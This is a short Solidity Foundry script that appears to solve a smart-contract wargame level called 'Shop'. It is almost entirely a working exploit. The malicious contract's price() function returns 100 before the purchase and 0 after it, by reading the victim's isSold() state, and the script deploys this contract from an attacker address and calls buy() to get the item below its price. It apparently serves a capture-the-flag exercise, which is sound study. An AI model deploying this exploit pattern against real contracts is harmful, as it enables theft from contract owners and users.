// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IShop {
    function buy() external;

    function isSold() external view returns(bool);
}

contract ShopMaliciousContract is Constants {
    function price() external view returns(uint256) {
        IShop victim = IShop(SHOP_ADDRESS);
        return victim.isSold() ? 0 : 100;
    }

    function attack(IShop victim) public {
        victim.buy();
    }
}

contract ShopAttacker is Constants, Script {

    function run() public {
        IShop victim = IShop(SHOP_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        ShopMaliciousContract _attacker = new ShopMaliciousContract();
        _attacker.attack(victim);
        vm.stopBroadcast();
    }
}
